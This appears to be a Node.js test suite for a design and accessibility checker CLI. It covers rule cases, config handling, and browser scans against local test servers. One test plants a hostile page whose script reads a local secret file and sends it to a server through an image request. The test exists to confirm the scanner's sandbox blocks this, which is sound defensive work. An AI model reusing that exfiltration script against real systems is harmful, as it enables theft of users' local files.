import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { findChrome } from '../src/story.js';

const BIN = join(dirname(dirname(fileURLToPath(import.meta.url))), 'bin', 'ai-design-check.js');
const made = [];
const project = (files = {}) => {
    const dir = mkdtempSync(join(tmpdir(), 'adc-cli-'));
    made.push(dir);
    for (const [name, content] of Object.entries(files)) {
        mkdirSync(dirname(join(dir, name)), { recursive: true });
        writeFileSync(join(dir, name), content);
    }

    return dir;
};
after(() => { for (const dir of made) rmSync(dir, { recursive: true, force: true }); });
const run = (cwd, args, input) => spawnSync(process.execPath, [BIN, ...args], { cwd, encoding: 'utf8', input });
// A file the checker reads with no finding in it, and one with a known error.
const CLEAN = '<p>Fine</p>\n';
const BAD = '<div class="mt-[13px]">Text</div>\n';
const spacingOf = (result) => JSON.parse(result.stdout).findings.filter((item) => item.rule === 'spacing-scale');

test('an option that is not understood stops the run', () => {
    const dir = project({ 'a.html': CLEAN });
    assert.equal(run(dir, ['--strcit']).status, 2);
    assert.equal(run(dir, ['--fix', '--dry-run=true']).status, 2);
    assert.equal(run(dir, ['--format', 'sarif']).status, 2);
    assert.equal(run(dir, ['--format']).status, 2);
});

test('-h and --version answer; a value may hold an equals sign', () => {
    const dir = project({ 'a.html': CLEAN });
    assert.match(run(dir, ['-h']).stdout, /Usage/);
    assert.match(run(dir, ['--version']).stdout, /^\d+\.\d+\.\d+/);
    run(dir, ['system', '--out=x=y', '--format', 'json']);
    assert.ok(existsSync(join(dir, 'x=y', 'tokens.css')));
});

test('a run that read nothing is not a pass', () => {
    assert.equal(run(project(), []).status, 2);
    assert.match(run(project({ 'README.md': '# x' }), []).stdout, /Nothing checked/);
    assert.equal(JSON.parse(run(project(), ['--json']).stdout).nothingChecked, true);
    const missing = run(project({ 'a.html': CLEAN }), ['no/such/path']);
    assert.equal(missing.status, 2);
    assert.match(missing.stderr, /Not found: no\/such\/path/);
    // A config file alone is not an interface.
    assert.equal(run(project({ 'tailwind.config.js': 'module.exports = {}', 'x.d.ts': '' }), []).status, 2);
    assert.match(run(project({ 'a.less': 'a{}' }), []).stdout, /1 \.less file/);
    assert.equal(run(project({ 'a.scss': 'a{}' }), []).status, 0); // SCSS is read now
});

test('init does not switch the checker off', () => {
    const dir = project({ 'app/page.html': BAD });
    run(dir, ['init']);
    assert.equal(spacingOf(run(dir, ['--json'])).length, 1);
});

test('a broken config or baseline says so and fails', () => {
    for (const [config, pattern] of [['{"rules":{"spacing-scale":"warning"}}', /severity "warning"/], ['{"ignore":"dist"}', /"ignore" must be a list/], ['{oops', /not valid JSON/]]) {
        const result = run(project({ 'a.html': BAD, 'ai-design-check.json': config }), ['--json']);
        assert.equal(result.status, 2);
        assert.match(result.stderr, pattern);
        assert.doesNotMatch(result.stderr, /\n\s+at /);
    }
    const result = run(project({ 'a.html': BAD, '.ai-design-check-baseline.json': 'nope' }), []);
    assert.equal(result.status, 2);
    assert.match(result.stderr, /--write-baseline/);
});

test('annotations cannot start a workflow command', () => {
    const dir = project({ 'a,b%.html': BAD });
    const { stdout } = run(dir, ['--format', 'github', 'a,b%.html']);
    assert.match(stdout, /file=a%2Cb%25\.html,/);
});

test('from a subfolder the project config and baseline apply', () => {
    const dir = project({ 'ai-design-check.json': '{"rules":{"spacing-scale":"off"}}', 'app/a.html': BAD, 'other/b.html': BAD });
    const result = run(join(dir, 'app'), ['--json']);
    assert.equal(spacingOf(result).length, 0);
    assert.equal(result.status, 0);
});

test('.gitignore and build folders are not read as source', () => {
    const dir = project({ 'a.html': CLEAN, '.gitignore': 'made/\n', 'made/x.html': BAD, '.next/y.html': BAD, 'coverage/z.html': BAD, 'out/w.html': BAD });
    assert.equal(spawnSync('git', ['init', '-q'], { cwd: dir }).status, 0);
    assert.equal(spacingOf(run(dir, ['--json'])).length, 0);
});

test('--fix leaves a file that is not UTF-8 untouched', () => {
    const dir = project();
    const bytes = Buffer.concat([Buffer.from('<div class="mt-[13px]">'), Buffer.from([0xfe, 0xf0, 0xfc]), Buffer.from('</div>\n')]);
    writeFileSync(join(dir, 'a.html'), bytes);
    assert.match(run(dir, ['--fix']).stdout, /not UTF-8/);
    assert.ok(readFileSync(join(dir, 'a.html')).equals(bytes));
});

test('--fix lowers the baseline, so its allowance cannot hide new findings', () => {
    const dir = project({ 'a.html': BAD });
    run(dir, ['--write-baseline']);
    run(dir, ['--fix']);
    assert.deepEqual(JSON.parse(readFileSync(join(dir, '.ai-design-check-baseline.json'), 'utf8')).counts, {});
    writeFileSync(join(dir, 'a.html'), '<div class="mt-[17px]">Text</div>\n');
    assert.equal(spacingOf(run(dir, ['--json'])).length, 1);
});

test('--fix writes only steps Tailwind 3 has', () => {
    const dir = project({ 'a.html': '<div class="mt-[53px] mb-[13px]">Text</div>\n' });
    run(dir, ['--fix']);
    const html = readFileSync(join(dir, 'a.html'), 'utf8');
    assert.match(html, /mt-\[52px\]|mt-13|mt-\[56px\]|mt-14/);
    assert.doesNotMatch(html, /mt-13\b/);
    assert.match(html, /mb-3\b/);
});

test('the hook respects the baseline and the config ignore, and bounds what it echoes', () => {
    const dir = project({ 'a.html': BAD, 'skip/b.html': BAD, 'ai-design-check.json': '{"ignore":["skip/**"]}' });
    const hook = (file) => run(dir, ['hook'], JSON.stringify({ tool_input: { file_path: join(dir, file) } }));
    assert.equal(hook('a.html').status, 2);
    assert.equal(hook('skip/b.html').status, 0);
    run(dir, ['--write-baseline']);
    assert.equal(hook('a.html').status, 0);
});

test('the hook names the file of each finding, when one sits in the component it uses', () => {
    const dir = project({
        'src/Market.tsx': "import { MarketAppTile } from './MarketAppTile';\nexport function Market({ apps }) {\n    return (\n        <div className=\"grid gap-4 lg:grid-cols-3\">\n            {apps.map((app) => <MarketAppTile key={app.id} app={app} />)}\n        </div>\n    );\n}\n",
        'src/MarketAppTile.tsx': 'export function MarketAppTile({ app }) {\n    return (\n        <a href={app.url} className="flex items-center gap-3">\n            <div className="min-w-0 flex-1"><p className="truncate">{app.name}</p></div>\n        </a>\n    );\n}\n',
    });
    const result = run(dir, ['hook'], JSON.stringify({ tool_input: { file_path: join(dir, 'src/Market.tsx') } }));
    assert.equal(result.status, 2);
    assert.match(result.stderr, /^ {2}src\/MarketAppTile\.tsx:3 {2}cell-holds-content/m);
    assert.doesNotMatch(result.stderr, /src\/Market\.tsx:3 {2}cell-holds-content/);
});

test('nothing is written through a symbolic link', () => {
    const dir = project({ 'a.html': BAD, 'target.txt': 'mine' });
    symlinkSync(join(dir, 'target.txt'), join(dir, '.ai-design-check-baseline.json'));
    assert.equal(run(dir, ['--write-baseline', '--no-baseline']).status, 2);
    assert.equal(readFileSync(join(dir, 'target.txt'), 'utf8'), 'mine');
});

test('system does not overwrite other files, and its output passes the checker', () => {
    const dir = project({ 'design-system/theme.css': 'mine', 'design-system/_variables.scss': 'mine' });
    assert.notEqual(run(dir, ['system']).status, 0);
    assert.equal(readFileSync(join(dir, 'design-system/theme.css'), 'utf8'), 'mine');
    assert.equal(readFileSync(join(dir, 'design-system/_variables.scss'), 'utf8'), 'mine');
    assert.equal(run(dir, ['system', '--force']).status, 0);
    assert.doesNotMatch(readFileSync(join(dir, 'design-system/theme.css'), 'utf8'), /@theme \{[^}]*color-scheme/);
    assert.equal(run(dir, ['--json', 'design-system/DesignSystem.kt']).status, 0);
    // The Bootstrap files, in one run so it counts as a check even where .scss is not read.
    const result = run(dir, ['--json', 'design-system/bootstrap.css', 'design-system/_variables.scss']);
    assert.equal(result.status, 0);
    assert.deepEqual(JSON.parse(result.stdout).findings.filter((item) => item.severity === 'error'), []);
    assert.match(readFileSync(join(dir, 'design-system/bootstrap.css'), 'utf8'), /\[data-bs-theme=dark\] \{/);
});

test('rules read what they promise', () => {
    const rulesIn = (name, content) => JSON.parse(run(project({ [name]: content }), ['--json', name]).stdout).findings.map((item) => item.rule);
    // JSX in a .js file.
    assert.ok(rulesIn('a.js', 'export const A = () => { return <div className="mt-[13px]">x</div>; };\n').includes('spacing-scale'));
    // Plain JavaScript keeps being plain JavaScript.
    assert.ok(!rulesIn('b.js', 'const a = "mt-[13px]";\n').includes('spacing-scale'));
    // An icon named by its set, not by a suffix.
    assert.ok(rulesIn('c.tsx', 'import { Trash2 } from "lucide-react";\nexport const C = () => <button onClick={f}><Trash2 /></button>;\n').includes('icon-button-name'));
    // The removal is not its own replacement.
    assert.ok(rulesIn('d.html', '<button class="focus:outline-none">Go</button>\n').includes('focus-ring-removed'));
    assert.ok(!rulesIn('e.html', '<button class="outline-none focus-visible:ring-2">Go</button>\n').includes('focus-ring-removed'));
    // Commented-out markup.
    assert.ok(!rulesIn('f.html', '<!-- <div class="mt-[13px]">old</div> -->\n<p>Now</p>\n').includes('spacing-scale'));
    assert.ok(!rulesIn('g.tsx', 'export const G = () => (<div>{/* <div className="mt-[13px]">old</div> */}</div>);\n').includes('spacing-scale'));
});

/** Findings of one rule per file: each case is its own file, so one run covers a table of cases. */
const ruleHits = (rule, files) => {
    const hits = Object.fromEntries(Object.keys(files).map((name) => [name, 0]));
    for (const item of JSON.parse(run(project(files), ['--json', ...Object.keys(files)]).stdout).findings) if (item.rule === rule) hits[item.path]++;
    return hits;
};

test('img-no-alt: an image needs alt, alt="" is decoration', () => {
    const hits = ruleHits('img-no-alt', {
        'flag-html.html': '<img src="a.png">\n',
        'flag-jsx.tsx': 'export const B = () => <img src={src} className="w-8" />;\n',
        'flag-next.tsx': 'import Image from "next/image";\nexport const C = () => <Image src={src} width={8} height={8} />;\n',
        'flag-spread-in-value.tsx': 'export const A = () => <img src={a} style={{ ...base, width: 8 }} />;\n',
        'flag-unquoted.html': '<img src=/img/alt>\n',
        'flag-alt-undefined.tsx': 'export const A = () => <img src={a} alt={undefined} />;\n',
        'pass-alt.html': '<img src="a.png" alt="">\n<img src="b.png" alt="Front view">\n',
        'pass-jsx.tsx': 'export const E = () => <><img src={src} alt={name} /><Image src={src} alt="" /></>;\n',
        'pass-spread.tsx': 'export const E = () => <img {...props} />;\n',
        'pass-vue.vue': '<template><img :src="src" :alt="name"></template>\n',
        'pass-vue-attrs.vue': '<template><img :src="src" v-bind="$attrs"></template>\n',
        'pass-blade.blade.php': '<img {{ $attributes }}>\n',
        'pass-blade-merge.blade.php': '<img {{ $attributes->merge(["class" => "w-8"]) }} src="x">\n',
        'pass-ts-type.tsx': 'type Image = { url: string };\nexport function A() { const [x] = useState<Image | null>(null); const l: Array<Image> = []; return <p>hi</p>; }\n',
        'pass-react-native.tsx': 'import { Image, View } from "react-native";\nexport const A = () => <View><Image source={src} src={src} accessibilityLabel="Logo" /></View>;\n',
        'pass-js-string.tsx': 'const html = \'<img src="x.png">\';\nexport const A = () => <p>{html}</p>;\n',
    });
    for (const [name, count] of Object.entries(hits)) assert.equal(count, name.startsWith('flag') ? 1 : 0, name);
});

test('clickable-div: onClick on a plain element needs a role or key handling', () => {
    const hits = ruleHits('clickable-div', {
        'flag-div.tsx': 'export const A = () => <div onClick={open}>Open</div>;\n',
        'flag-span.html': '<span onclick="go()">Go</span>\n',
        'flag-role-not-interactive.tsx': 'export const C = () => <li role="presentation" onClick={pick}>One</li>;\n',
        'flag-spread-in-handler.tsx': 'export const A = () => <div onClick={() => setS({ ...s, open: true })}>Open</div>;\n',
        'flag-vue.vue': '<template><div @click="open">a</div></template>\n',
        'flag-vue-on.vue': '<template><li v-on:click.stop="pick">a</li></template>\n',
        'flag-svelte.svelte': '<div on:click={open}>a</div>\n',
        'flag-livewire.blade.php': '<li wire:click="pick">x</li>\n',
        'flag-motion.tsx': 'export const A = () => <motion.div onClick={open}>Open</motion.div>;\n',
        'flag-svg.tsx': 'export const A = () => <svg onClick={open} />;\n',
        'flag-icon.tsx': 'export const A = () => <i className="fa fa-times" onClick={close} />;\n',
        'flag-strong.tsx': 'export const A = () => <strong onClick={o}>x</strong>;\n',
        'flag-capture.tsx': 'export const A = () => <div onClickCapture={o}>x</div>;\n',
        'flag-mousedown.tsx': 'export const A = () => <div onMouseDown={o}>x</div>;\n',
        'pass-role.tsx': 'export const D = () => <div role="button" tabIndex={0} onClick={open}>Open</div>;\n',
        'pass-role-computed.tsx': 'export const D = () => <div role={role} onClick={open}>Open</div>;\n',
        'pass-keydown.tsx': 'export const E = () => <td onClick={open} onKeyDown={key}>Open</td>;\n',
        'pass-keyup.tsx': 'export const E = () => <td onClick={open} onKeyUp={key}>Open</td>;\n',
        'pass-keypress.tsx': 'export const E = () => <td onClick={open} onKeyPress={key}>Open</td>;\n',
        'pass-controls.tsx': 'export const F = () => <><button onClick={a}>A</button><a href="/x" onClick={b}>B</a><input onClick={c} /><summary onClick={d}>D</summary><label onClick={e}>E</label></>;\n',
        'pass-html.html': '<button onclick="go()">Go</button>\n<div onclick="go()" role="link" tabindex="0">Go</div>\n',
        'pass-spread.tsx': 'export const A = () => <div {...rest} onClick={open}>x</div>;\n',
        'pass-component.vue': '<template><el-button @click="open">a</el-button></template>\n',
        'pass-outside.vue': '<template><div @click.outside="close">a</div><div v-on:click.away="close">b</div></template>\n',
        'pass-vue-role.vue': '<template><div @click="open" :role="\'button\'" tabindex="0">a</div></template>\n',
        'pass-vue-role-computed.vue': '<template><div @click="open" v-bind:role="r">a</div></template>\n',
        'pass-vue-keys.vue': '<template><div @click="open" @keydown.enter="open">a</div></template>\n',
        'pass-vue-attrs.vue': '<template><div @click="open" v-bind="$attrs">a</div></template>\n',
        'pass-js-string.tsx': 'const html = \'<div onclick="go()">x</div>\';\nexport const A = () => <p>{html}</p>;\n',
    });
    for (const [name, count] of Object.entries(hits)) assert.equal(count, name.startsWith('flag') ? 1 : 0, name);
});

test('focus-ring-removed skips tabindex="-1" on a plain element: focused by script, never by Tab', () => {
    const hits = ruleHits('focus-ring-removed', {
        'pass-jsx.tsx': 'export const A = () => <h1 ref={ref} tabIndex={-1} className="outline-none">Title</h1>;\n',
        'pass-html.html': '<main tabindex="-1" class="outline-none">x</main>\n',
        'pass-unquoted.html': '<main tabindex=-1 class="outline-none">x</main>\n',
        'pass-string.tsx': 'export const A = () => <div tabIndex={"-1"} className="outline-none">x</div>;\n',
        'pass-live-region.tsx': 'export const A = () => <p ref={ref} role="status" tabIndex={-1} className="outline-none">Saved</p>;\n',
        'pass-less-than.tsx': 'export const A = () => <div tabIndex={-1} onChange={() => a < b} className="outline-none">x</div>;\n',
        'flag-zero.tsx': 'export const C = () => <div tabIndex={0} className="outline-none">x</div>;\n',
        'flag-none.tsx': 'export const D = () => <div className="outline-none">x</div>;\n',
        'flag-option.tsx': 'export const A = () => <li role="option" tabIndex={-1} className="outline-none">x</li>;\n',
        'flag-button.tsx': 'export const A = () => <button tabIndex={-1} className="outline-none">x</button>;\n',
    });
    for (const [name, count] of Object.entries(hits)) assert.equal(count, name.startsWith('flag') ? 1 : 0, name);
});

test('sentence-case: macOS commands, buttons and menu items keep Title Case; the web stays sentence case', () => {
    const casesIn = (name, content) => JSON.parse(run(project({ [name]: content }), ['--json', name]).stdout).findings.filter((item) => item.rule === 'sentence-case').map((item) => item.value);
    const swift = [
        'Button("Grant Access…") {}',
        'Button { open() } label: { Label("Show in Finder", systemImage: "folder") }',
        'Button(action: open) { HStack { Text("Insert Placeholder") } }',
        'Menu("More Options") { Toggle("Web Search", isOn: $on) }',
        'Text("Copy Chat").contextMenu { Text("Copy Deeplink") }',
        'PrimaryButton(title: "Open Settings")',
        'Button(LocalizedStringResource("grant", defaultValue: "Grant Access…")) {}',
        'let openVerb: LocalizedStringResource = "Open Folder"',
    ].join('\n');
    assert.deepEqual(casesIn('a.swift', `${swift}\n`), ['Text("Copy Chat"']);
    // Not a command: headings, rows and LocalizedStringResource text keep sentence case.
    assert.deepEqual(casesIn('b.swift', 'LabeledContent { Button("Add Header") {} } label: { Text("Request Headers") }\nlet title: LocalizedStringResource = "Upcoming Payments"\nlet hint = LocalizedStringResource("hint", defaultValue: "Recent Activity")\n'), ['Text("Request Headers"', 'LocalizedStringResource = "Upcoming Payments"', 'LocalizedStringResource("hint", defaultValue: "Recent Activity"']);
    assert.deepEqual(casesIn('c.tsx', 'export const C = () => <Button label="Grant Access" title="Show In Finder" />;\n'), ['Grant Access', 'Show In Finder']);
    // A String Catalog is never read for case.
    assert.deepEqual(casesIn('Localizable.xcstrings', JSON.stringify({ sourceLanguage: 'en', strings: { 'Grant Access…': { localizations: { de: { stringUnit: { state: 'translated', value: 'Zugriff Gewähren…' } } } } } })), []);
});

test('a one-line ignore covers one line outside a tag, and a whole unfinished tag', () => {
    const code = 'export const A = () => <div>\n{/* ai-design-check-ignore-next-line spacing-scale -- why */}\n<p>x</p>\n<p className="mt-[13px]">y</p>\n</div>;\n';
    assert.equal(spacingOf(run(project({ 'a.tsx': code }), ['--json'])).length, 1);
    const tag = '<!-- ai-design-check-ignore-next-line spacing-scale -- why -->\n<div\n  class="mt-[13px]"\n>x</div>\n';
    assert.equal(spacingOf(run(project({ 'b.html': tag }), ['--json'])).length, 0);
});

test('an inlined font or image does not stall the run', () => {
    const blob = 'A'.repeat(400000);
    const dir = project({ 'a.css': `@font-face { src: url(data:font/woff2;base64,${blob}); }\n`, 'b.ts': `export const logo = "data:image/png;base64,${blob}";\nexport const c = "x" + y;\n` });
    const started = process.hrtime.bigint();
    run(dir, ['--json']);
    assert.ok(Number(process.hrtime.bigint() - started) / 1e9 < 20, 'took too long');
});

// A server that answers as asked, for the pages that must not count as checked.
const served = async (handler, work) => {
    const server = createServer(handler);
    await new Promise((done) => server.listen(0, '127.0.0.1', done));
    try {
        return await work(`http://127.0.0.1:${server.address().port}`);
    } finally {
        server.close();
    }
};
const runAsync = (cwd, args, env = {}) => new Promise((done) => {
    import('node:child_process').then(({ spawn }) => {
        const child = spawn(process.execPath, [BIN, ...args], { cwd, env: { ...process.env, ...env }, stdio: ['ignore', 'pipe', 'pipe'] });
        let stdout = '';
        let stderr = '';
        child.stdout.on('data', (chunk) => { stdout += chunk; });
        child.stderr.on('data', (chunk) => { stderr += chunk; });
        child.on('close', (status) => done({ status, stdout, stderr }));
    });
});

test('scan and narrow fail on a page that is not there', { skip: !findChrome() }, async () => {
    const dir = project();
    assert.equal((await runAsync(dir, ['scan', 'http://127.0.0.1:9/'])).status, 1);
    await served((request, response) => {
        if (request.url === '/500') { response.writeHead(500, { 'content-type': 'text/html' }); response.end('<h1>Server error</h1>'); return; }
        if (request.url === '/json') { response.writeHead(200, { 'content-type': 'application/json' }); response.end('{}'); return; }
        response.writeHead(200, { 'content-type': 'text/html' }); response.end('<!doctype html><html><body><div id="root"></div></body></html>');
    }, async (base) => {
        const failed = await runAsync(dir, ['scan', `${base}/500`]);
        assert.equal(failed.status, 1);
        assert.match(failed.stderr, /HTTP 500/);
        assert.match((await runAsync(dir, ['scan', `${base}/json`])).stderr, /application\/json/);
        assert.match((await runAsync(dir, ['scan', `${base}/empty`])).stderr, /empty page/);
        assert.equal((await runAsync(dir, ['narrow', `${base}/500`])).status, 1);
        assert.doesNotMatch((await runAsync(dir, ['scan', `${base}/500`, '--allow-status', '500'])).stderr, /HTTP 500/);
    });
});

test('a local page cannot read local files', { skip: !findChrome() }, async () => {
    const dir = project({ 'secret.txt': 'CANARY' });
    let got = '';
    await served((request, response) => { got += decodeURIComponent(request.url); response.end(); }, async (base) => {
        writeFileSync(join(dir, 'hostile.html'), `<!doctype html><html lang="en"><body><p>Words here</p><script>
let text = 'BLOCKED';
try { const xhr = new XMLHttpRequest(); xhr.open('GET', ${JSON.stringify(`file://${join(dir, 'secret.txt')}`)}, false); xhr.send(); text = xhr.responseText; } catch {}
new Image().src = ${JSON.stringify(`${base}/?d=`)} + text;
</script></body></html>`);
        await runAsync(dir, ['narrow', 'hostile.html']);
    });
    assert.doesNotMatch(got, /CANARY/);
});

const page = (title, body) => `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>${title}</title></head><body><main><h1>${title}</h1>${body}</main></body></html>`;
// A site with a sign-in: /dashboard always sends the browser there, /app needs a session cookie, /team a token header.
const gated = (request, response) => {
    const show = (html) => { response.writeHead(200, { 'content-type': 'text/html' }); response.end(html); };
    const toSignIn = () => { response.writeHead(302, { location: '/login?next=%2Fapp' }); response.end(); };
    const url = request.url.split('?')[0];
    if (url === '/login') return show(page('Sign in', '<form><label>Password <input type="password" name="password"></label><button>Sign in</button></form>'));
    if (url === '/app' && /(?:^|;\s*)session=s3cret-cookie(?:;|$)/.test(request.headers.cookie ?? '')) return show(page('Projects', '<p>Three projects this week.</p>'));
    if (url === '/team' && request.headers['x-token'] === 's3cret-header') return show(page('Team', '<p>Four people on the team.</p>'));
    return url === '/favicon.ico' ? response.end() : toSignIn();
};

test('a page that sends the browser to sign in is not checked as itself', { skip: !findChrome() }, async () => {
    const dir = project();
    await served(gated, async (base) => {
        const stopped = await runAsync(dir, ['scan', `${base}/dashboard`]);
        assert.equal(stopped.status, 2, stopped.stderr);
        assert.match(stopped.stderr, /sent the browser to http:\/\/127\.0\.0\.1:\d+\/login, which looks like a sign-in page/);
        assert.match(stopped.stderr, /--cookie/);
        assert.match(stopped.stderr, /--header/);
        assert.doesNotMatch(stopped.stderr, /next=/); // the address it landed on is named without its query
        assert.equal((await runAsync(dir, ['narrow', `${base}/dashboard`])).status, 2);
        const allowed = await runAsync(dir, ['scan', `${base}/dashboard`, '--allow-redirect', '--json']);
        assert.notEqual(allowed.status, 2, allowed.stderr);
        assert.equal(JSON.parse(allowed.stdout).pages[0].measured, `${base}/login`);
    });
});

test('a signed-in page is reached with a cookie or a header, whose values are never printed', { skip: !findChrome() }, async () => {
    const dir = project();
    // A malformed one stops the run before anything opens, without showing it.
    const malformed = run(dir, ['scan', 'http://127.0.0.1:9/', '--cookie', 's3cret-without-a-name']);
    assert.equal(malformed.status, 2);
    assert.doesNotMatch(malformed.stderr, /s3cret/);
    await served(gated, async (base) => {
        const said = [];
        for (const [args, env] of [
            [['scan', `${base}/app`, '--cookie', 'session=s3cret-cookie', '--json'], {}],
            [['scan', `${base}/app`, '--json'], { AI_DESIGN_CHECK_COOKIE: 'theme=dark; session=s3cret-cookie' }],
            [['scan', `${base}/team`, '--json'], { AI_DESIGN_CHECK_HEADERS: 'Accept-Language: en\nX-Token: s3cret-header' }],
        ]) {
            const result = await runAsync(dir, args, env);
            assert.notEqual(result.status, 2, result.stderr);
            const [checked] = JSON.parse(result.stdout).pages;
            assert.equal(checked.error, undefined);
            assert.equal(checked.measured, undefined); // the page itself, not the sign-in page
            said.push(result.stdout, result.stderr);
        }
        assert.doesNotMatch(said.join('\n'), /s3cret/);
    });
});

test('scan checks every page it is given, each under its own address', { skip: !findChrome() }, async () => {
    const dir = project();
    const broken = (name) => page(`Page ${name}`, `<p>Words on page ${name}.</p><script>throw new Error('boom-${name}')</script>`);
    await served((request, response) => { response.writeHead(200, { 'content-type': 'text/html' }); response.end(broken(request.url.slice(1))); }, async (base) => {
        const json = JSON.parse((await runAsync(dir, ['scan', `${base}/a`, `${base}/b`, '--json'])).stdout);
        assert.deepEqual(json.pages.map((item) => item.url), [`${base}/a`, `${base}/b`]);
        for (const name of ['a', 'b']) assert.ok(json.findings.some((item) => item.path === `${base}/${name}` && item.rule === 'no-script-errors' && item.value.includes(`boom-${name}`)), JSON.stringify(json.findings));
        const text = await runAsync(dir, ['scan', `${base}/a`, `${base}/b`]);
        assert.equal(text.status, 1);
        for (const name of ['a', 'b']) assert.match(text.stdout, new RegExp(`\\d+ errors, \\d+ warnings, \\d+ notes\\. ${base}/${name}\\n`));
        assert.match(text.stdout, /2 of 2 pages checked/);
    });
});

test('designSystem in the config reaches the scan', { skip: !findChrome() }, async () => {
    const dir = project({ 'ai-design-check.json': JSON.stringify({ designSystem: { fonts: ['Georgia'] } }) });
    await served((request, response) => { response.writeHead(200, { 'content-type': 'text/html' }); response.end(page('Fonts', '<p style="font-family:Arial">Words in a font the system does not have.</p>')); }, async (base) => {
        const { findings } = JSON.parse((await runAsync(dir, ['scan', `${base}/`, '--json'])).stdout);
        assert.ok(findings.some((item) => item.rule === 'design-system-drift' && /Arial/.test(item.value)), JSON.stringify(findings));
    });
});

test('a --header goes to the page and never to the other hosts it loads from', { skip: !findChrome() }, async () => {
    const dir = project();
    const seen = { other: [], redirected: [] };
    const other = (request, response) => {
        seen.other.push(request.headers['x-token']);
        response.writeHead(200, { 'content-type': 'text/css' });
        response.end('p { color: inherit; }');
    };
    await served(other, async (elsewhere) => {
        const own = (request, response) => {
            const url = request.url.split('?')[0];
            const show = (html) => { response.writeHead(200, { 'content-type': 'text/html' }); response.end(html); };
            if (url === '/hop') { response.writeHead(302, { location: '/team' }); return response.end(); }
            if (url === '/away') { response.writeHead(302, { location: `${elsewhere}/seen.css` }); return response.end(); }
            if (url === '/team' && request.headers['x-token'] === 's3cret-header' && /session=s3cret-cookie/.test(request.headers.cookie ?? '')) {
                return show(page('Team', `<link rel="stylesheet" href="${elsewhere}/style.css"><p>Four people on the team.</p><img src="/away" alt="">`));
            }
            if (url === '/favicon.ico' || url.endsWith('.png')) return response.end();
            response.writeHead(401);
            response.end('no');
        };
        await served(own, async (base) => {
            const result = await runAsync(dir, ['scan', `${base}/hop`, '--header', 'X-Token: s3cret-header', '--cookie', 'session=s3cret-cookie', '--json']);
            const [checked] = JSON.parse(result.stdout).pages;
            assert.equal(checked.error, undefined, result.stderr);
            assert.ok(seen.other.length > 0, 'the other host was asked');
            assert.deepEqual(seen.other.filter(Boolean), []);
        });
    });
});

// Answers 200 at the address asked for, as an app does when it draws its own sign-in screen.
const inPlace = (request, response) => {
    const url = request.url.split('?')[0];
    const filler = '<p>Three projects moved forward this week, and the team closed most of what was open.</p>'.repeat(12);
    const pages = {
        '/app': page('Acme', '<form><label>Email <input type="email" name="email"></label><label>Password <input type="password" name="password"></label><button>Continue</button></form>'),
        '/first': page('Acme', '<h1>Welcome back</h1><form><label>Email <input type="email" name="email"></label><button>Sign in</button></form>'),
        '/login': page('Acme', '<form><label>Password <input type="password" name="password"></label><button>Sign in</button></form>'),
        '/signup': page('Acme', '<form><label>Password <input type="password" name="password"></label><button>Create account</button></form>'),
        '/news': page('Acme', '<h1>Coming soon</h1><form><label>Email <input type="email" name="email"></label><button>Tell me</button></form>'),
        '/long': page('Acme', `${filler}<form><label>Password <input type="password" name="password"></label><button>Sign in</button></form>`),
    };
    response.writeHead(pages[url] ? 200 : 404, { 'content-type': 'text/html' });
    response.end(pages[url] ?? '');
};

test('a sign-in form drawn at the address asked for stops the scan; pages that merely hold a form do not', { skip: !findChrome() }, async () => {
    const dir = project();
    await served(inPlace, async (base) => {
        for (const path of ['/app', '/first']) {
            const stopped = await runAsync(dir, ['scan', `${base}${path}`]);
            assert.equal(stopped.status, 2, `${path}: ${stopped.stdout}${stopped.stderr}`);
            assert.match(stopped.stderr, /shows a sign-in form in place of the page/);
            assert.notEqual((await runAsync(dir, ['scan', `${base}${path}`, '--allow-redirect'])).status, 2);
        }
        for (const path of ['/login', '/signup', '/news', '/long']) {
            const result = await runAsync(dir, ['scan', `${base}${path}`]);
            assert.notEqual(result.status, 2, `${path}: ${result.stderr}`);
        }
    });
});
